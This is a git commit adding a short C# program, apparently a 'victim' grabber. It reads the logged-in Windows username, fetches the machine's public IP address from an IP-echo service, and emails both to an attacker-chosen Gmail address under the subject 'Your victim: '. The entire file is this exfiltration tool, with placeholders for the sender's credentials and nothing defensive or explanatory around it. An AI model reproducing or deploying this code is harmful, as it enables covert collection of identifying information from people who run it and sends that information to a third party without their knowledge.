aad1de77a52ea4e7476059117ebe44fc411e536a
Nubet <77124888+Nubet@users.noreply.github.com>
2021-03-31 13:36:49 +0200

    Add files via upload

---
+++ Program.cs
@@ -0,0 +1,55 @@
+﻿using System;
+using System.Net;
+using System.Net.Mail;
+using System.Linq;
+using System.Security.Principal;
+using Microsoft.Win32;
+using System.Runtime.InteropServices;
+
+namespace SendMailViaGmail
+{
+   class Program
+   {
+   static void Main(string[] args)
+   {
+      string user = Environment.UserName;
+      var ip = new WebClient().DownloadString("http://icanhazip.com");       //Downloading and saving ip to string      
+      
+
+      
+      
+      string SendersAddress = "SenderEmail@gmail.com"; //ONLY GMAIL!
+      string ReceiversAddress = "ReceiverEmail@gmail.com"; 
+      const string SendersPassword = "PASSWORD"; //PASSWORD to email here
+      const string subject = "Your victim: "; //subject
+      const string body = "IP: "; //Body
+
+      try
+      {
+        
+        //gmails smtp server name is smtp.gmail.com and port number is 587
+        SmtpClient smtp = new SmtpClient
+        {
+           Host = "smtp.gmail.com",
+           Port = 587,
+           EnableSsl = true,
+           DeliveryMethod = SmtpDeliveryMethod.Network,
+           Credentials    = new NetworkCredential(SendersAddress, SendersPassword),
+           Timeout = 3000 //do not change
+        };
+
+      
+       
+        MailMessage message = new MailMessage(SendersAddress, ReceiversAddress, subject + user , body + ip);
+        smtp.Send(message); //Send message
+        
+     }
+
+     catch (Exception ex)
+     {
+        Console.WriteLine(ex.Message);
+      
+     }
+    }
+   }
+ }
